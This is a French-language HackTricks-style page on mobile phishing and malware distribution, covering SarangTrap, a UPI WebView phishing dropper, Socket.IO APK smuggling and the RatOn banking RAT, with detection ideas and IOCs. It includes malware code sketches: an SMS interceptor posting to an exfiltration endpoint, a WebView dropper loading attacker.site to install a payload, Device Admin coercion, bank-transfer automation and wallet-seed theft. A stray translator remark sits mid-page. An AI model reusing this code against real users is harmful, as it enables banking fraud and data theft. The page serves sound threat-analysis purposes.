# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par des acteurs de menace pour distribuer **malicious Android APKs** et **iOS mobile-configuration profiles** via le phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Le matériel est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Enregistrer des dizaines de domaines look-alike (dating, cloud share, car service…).
– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour ranker sur Google.
– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même landing page.
2. **First Stage Download**
* Android : lien direct vers un APK *unsigned* ou provenant d’un “third-party store”.
* iOS : `itms-services://` ou lien HTTPS simple vers un **mobileconfig** profile malveillant (voir ci‑dessous).
3. **Post-install Social Engineering**
* Au premier lancement l'app demande un **invitation / verification code** (illusion d'accès exclusif).
* Le code est **POSTed over HTTP** au Command-and-Control (C2).
* Le C2 répond `{"success":true}` ➜ le malware continue.
* Une sandbox / AV en dynamic analysis qui ne soumet jamais de code valide ne voit **aucun comportement malveillant** (evasion).
4. **Runtime Permission Abuse** (Android)
* Les permissions dangereuses ne sont demandées **qu'après une réponse positive du C2** :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Les variantes récentes **suppriment `<uses-permission>` pour SMS du `AndroidManifest.xml`** mais laissent le chemin Java/Kotlin lisant les SMS via reflection ⇒ réduit le score statique tout en restant fonctionnel sur des devices qui accordent la permission via `AppOps` abuse ou des cibles anciennes.
5. **Facade UI & Background Collection**
* L'app affiche des vues inoffensives (SMS viewer, gallery picker) implémentées localement.
* Pendant ce temps elle exfiltre :
- IMEI / IMSI, numéro de téléphone
- Dump complet de `ContactsContract` (array JSON)
- JPEG/PNG depuis `/sdcard/DCIM` compressés avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
- SMS optionnels (`content://sms`)
Les payloads sont **batch-zippés** et envoyés via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. pour enrôler l'appareil dans une supervision de type “MDM”.
* Instructions de social engineering :
1. Ouvrir Settings ➜ *Profile downloaded*.
2. Taper *Install* trois fois (captures d'écran sur la page de phishing).
3. Trust le profile unsigned ➜ l'attaquant obtient les entitlements *Contacts* & *Photo* sans revue App Store.
7. **Network Layer**
* HTTP plain, souvent sur le port 80 avec un HOST header du type `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Pendant l'évaluation du malware, automatiser la phase du invitation code avec Frida/Objection pour atteindre la branche malveillante.
* **Manifest vs. Runtime Diff** – Comparer `aapt dump permissions` avec le runtime `PackageManager#getRequestedPermissions()` ; l'absence de perms dangereuses est un signal d'alerte.
* **Network Canary** – Configurer `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des rafales de POST suspectes après l'entrée du code.
* **mobileconfig Inspection** – Utiliser `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer les entitlements excessifs.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** pour détecter des rafales soudaines de domaines riches en mots-clés.
* **User-Agent & Path Regex** : `(?i)POST\s+/(check|upload)\.php` depuis des clients Dalvik hors Google Play.
* **Invite-code Telemetry** – POST de codes numériques de 6–8 chiffres peu de temps après l'installation de l'APK peut indiquer une phase de staging.
* **MobileConfig Signing** – Bloquer les configuration profiles unsigned via une policy MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicateurs (Génériques)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – schéma Dropper + FCM C2

Ce schéma a été observé dans des campagnes abusant de thèmes liés aux prestations gouvernementales pour voler des identifiants UPI indiens et des OTP. Les opérateurs enchaînent des plateformes réputées pour la diffusion et la résilience.

### Chaîne de livraison via des plateformes de confiance
- Appât vidéo YouTube → la description contient un lien court
- Lien court → site de phishing hébergé sur GitHub Pages imitant le portail légitime
- Le même repo GitHub héberge un APK avec un faux badge “Google Play” pointant directement vers le fichier
- Des pages de phishing dynamiques sont hébergées sur Replit ; le canal de commandes à distance utilise Firebase Cloud Messaging (FCM)

### Dropper avec payload intégré et installation hors ligne
- Le premier APK est un installer (dropper) qui embarque le vrai malware à `assets/app.apk` et invite l'utilisateur à désactiver le Wi‑Fi/les données mobiles pour atténuer la détection dans le cloud.
- Le payload embarqué s'installe sous un libellé anodin (par ex., “Secure Update”). Après l'installation, l'installateur et le payload sont présents en tant qu'applications séparées.

Astuce de triage statique (grep pour embedded payloads) :
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Découverte dynamique des endpoints via shortlink
- Malware récupère une liste en texte brut, séparée par des virgules, d'endpoints actifs depuis un shortlink ; de simples transformations de chaînes produisent le chemin final de la page de phishing.

Exemple (sanitisé) :
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code :
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- L'étape “Make payment of ₹1 / UPI‑Lite” charge un formulaire HTML malveillant depuis l'endpoint dynamique à l'intérieur d'une WebView et capture des champs sensibles (phone, bank, UPI PIN) qui sont `POST`ed vers `addup.php`.

Chargeur minimal :
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagation et interception des SMS/OTP
- Des permissions agressives sont demandées au premier lancement :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Les contacts sont parcourus pour envoyer en masse des SMS de smishing depuis l'appareil de la victime.
- Les SMS entrants sont interceptés par un broadcast receiver et téléversés avec des métadonnées (expéditeur, contenu, SIM slot, ID aléatoire par appareil) vers `/addsm.php`.

Esquisse du broadcast receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) en tant que C2 résilient
- Le payload s'enregistre auprès de FCM ; les push messages contiennent un champ `_type` utilisé comme commutateur pour déclencher des actions (p.ex. mettre à jour les modèles de texte de phishing, activer/désactiver des comportements).

Exemple de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquisse du Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Schémas de détection et IOCs
- L'APK contient une charge secondaire dans `assets/app.apk`
- WebView charge le paiement depuis `gate.htm` et exfiltre vers `/addup.php`
- Exfiltration de SMS vers `/addsm.php`
- Récupération de config via shortlink (p.ex., `rebrand.ly/*`) retournant des endpoints CSV
- Applications étiquetées comme génériques “Update/Secure Update”
- Messages FCM `data` avec un discriminateur `_type` dans des apps non fiables

### Idées de détection et de défense
- Signaler les apps qui demandent aux utilisateurs de désactiver le réseau pendant l'installation puis side-load un second APK depuis `assets/`.
- Alerter sur le tuple de permissions : `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flux de paiement basés sur WebView.
- Surveillance de l'egress pour `POST /addup.php|/addsm.php` sur des hôtes non d'entreprise ; bloquer l'infrastructure connue.
- Règles Mobile EDR : app non fiable s'enregistrant pour FCM et se comportant différemment selon le champ `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré dans des pages leurres ressemblant à Google Play. Cela dissimule l'URL du payload, contourne les filtres d'URL/extension et préserve une UX d'installation réaliste.

Flux client typique observé sur le terrain :
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Pourquoi cela échappe à des contrôles simples :
- Aucune URL APK statique n'est exposée ; la charge utile est reconstruite en mémoire à partir de frames WebSocket.
- Les filtres URL/MIME/extensions qui bloquent les réponses .apk directes peuvent manquer les données binaires tunnelisées via WebSockets/Socket.IO.
- Les crawlers et sandboxes d'URL qui n'exécutent pas WebSockets ne récupéreront pas la charge utile.

Idées pour la chasse et la détection :
- Web/network telemetry : signaler les sessions WebSocket qui transfèrent de gros blocs binaires suivis de la création d'un Blob avec le MIME application/vnd.android.package-archive et d'un clic programmatique `<a download>`. Rechercher des chaînes client comme socket.emit('startDownload'), et des événements nommés chunk, downloadProgress, downloadComplete dans les scripts de page.
- Play-store spoof heuristics : sur des domaines non-Google servant des pages de type Play, rechercher des Google Play UI strings telles que http.html:"VfPpkd-jY41G-V67aGc", des templates en langues mélangées, et de faux flux de “verification/progress” pilotés par des événements WS.
- Controls : bloquer la distribution d'APK depuis des origines non-Google ; appliquer des politiques MIME/extensions incluant le trafic WebSocket ; préserver les invites de téléchargement sécurisé du navigateur.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

La campagne RatOn banker/RAT (ThreatFabric) est un exemple concret de la manière dont les opérations modernes de phishing mobile combinent WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, et même NFC-relay orchestration. Cette section abstrait les techniques réutilisables.

### Stage-1: WebView → native install bridge (dropper)
Les attaquants affichent un WebView pointant vers une page attaquante et injectent une interface JavaScript qui expose un installateur natif. Un tap sur un bouton HTML appelle du code natif qui installe un APK de deuxième étape inclus dans les assets du dropper puis le lance directement.

Patron minimal :
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Veuillez coller le HTML de la page à traduire. Je traduirai le texte anglais pertinent en français en conservant exactement la même syntaxe markdown/html et en respectant les consignes (ne pas traduire code, noms techniques, tags, liens, chemins, etc.).
```html
<button onclick="bridge.installApk()">Install</button>
```
Après l'installation, le dropper lance le payload via un package/activity explicite :
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idée de chasse aux menaces : applications non fiables appelant `addJavascriptInterface()` et exposant des méthodes de type installateur au WebView ; APK embarquant une charge utile secondaire sous `assets/` et invoquant le Package Installer Session API.

### Entonnoir de consentement : Accessibility + Device Admin + demandes runtime ultérieures
Stage-2 ouvre un WebView qui héberge une page “Access”. Son bouton invoque une méthode exportée qui dirige la victime vers les paramètres Accessibility et demande l'activation du service malveillant. Une fois accordée, le malware utilise Accessibility pour cliquer automatiquement à travers les dialogues de permission runtime suivants (contacts, overlay, manage system settings, etc.) et demande Device Admin.

- Accessibility aide programmaticalement à accepter les invites suivantes en trouvant des boutons comme «Autoriser»/«OK» dans l'arbre de nœuds et en simulant des clics.
- Vérification/demande de la permission overlay :
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Voir aussi :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Les opérateurs peuvent émettre des commandes pour :
- afficher une superposition plein écran depuis une URL, ou
- fournir du HTML inline chargé dans une superposition WebView.

Usages probables : contrainte (saisie du PIN), ouverture de wallet pour capturer les PINs, messages de rançon. Prévoir une commande pour vérifier/obtenir la permission d'overlay si elle est absente.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth : périodiquement dumper l'arbre de noeuds Accessibility, sérialiser les textes/roles/bounds visibles et envoyer au C2 comme pseudo-écran (commandes comme `txt_screen` une fois et `screen_live` en continu).
- High-fidelity : demander MediaProjection et lancer la diffusion/enregistrement d'écran à la demande (commandes comme `display` / `record`).

### ATS playbook (automatisation d'applications bancaires)
Étant donné une tâche JSON, ouvrir l'application bancaire, piloter l'UI via Accessibility en combinant requêtes textuelles et taps par coordonnées, et saisir le PIN de paiement de la victime lorsqu'il est demandé.

Exemple de tâche :
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemples de textes vus dans un flux cible (CZ → EN):
- "Nová platba" → "Nouveau paiement"
- "Zadat platbu" → "Saisir le paiement"
- "Nový příjemce" → "Nouveau bénéficiaire"
- "Domácí číslo účtu" → "Numéro de compte national"
- "Další" → "Suivant"
- "Odeslat" → "Envoyer"
- "Ano, pokračovat" → "Oui, continuer"
- "Zaplatit" → "Payer"
- "Hotovo" → "Terminé"

Les opérateurs peuvent aussi vérifier/augmenter les limites de transfert via des commandes comme `check_limit` et `limit` qui naviguent de manière similaire dans l'interface des limites.

### Extraction de la seed d'un portefeuille crypto
Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Déroulement : déverrouiller (PIN volé ou mot de passe fourni), naviguer vers Sécurité/Récupération, révéler/afficher la seed phrase, keylog/exfiltrate it. Implémenter des sélecteurs sensibles à la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.

### Device Admin coercion
Device Admin APIs sont utilisées pour augmenter les opportunités de capture du PIN et frustrer la victime :

- Verrouillage immédiat :
```java
dpm.lockNow();
```
- Faire expirer le credential actuel pour forcer le changement (Accessibility capture le nouveau PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forcer le déverrouillage non-biométrique en désactivant les fonctionnalités biométriques de keyguard :
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### Orchestration de relai NFC (NFSkate)
Stage-3 peut installer et lancer un module NFC-relay externe (p.ex., NFSkate) et même lui fournir un template HTML pour guider la victime pendant le relai. Cela permet des cash-out card-present sans contact parallèlement à des ATS en ligne.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Jeu de commandes opérateur (exemple)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Idées de détection et de défense (RatOn-style)
- Rechercher des WebViews avec `addJavascriptInterface()` exposant des méthodes d'installer/de permission ; des pages se terminant par “/access” qui déclenchent des invites Accessibility.
- Alerter sur des apps qui génèrent des gestes/clicks Accessibility à haute fréquence peu après l'octroi de l'accès au service ; télémetrie ressemblant à des dumps de nœuds Accessibility envoyés au C2.
- Surveiller les changements de policy Device Admin dans des apps non fiables : `lockNow`, expiration de mot de passe, basculements des fonctionnalités de keyguard.
- Alerter sur des invites MediaProjection provenant d'apps non-corporatives suivies d'uploads périodiques de frames.
- Détecter l'installation/le lancement d'une app NFC-relay externe déclenchée par une autre app.
- Pour le secteur bancaire : imposer des confirmations out-of-band, le biometrics-binding, et des limites de transaction résistantes à l'automatisation on-device.

## Références

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
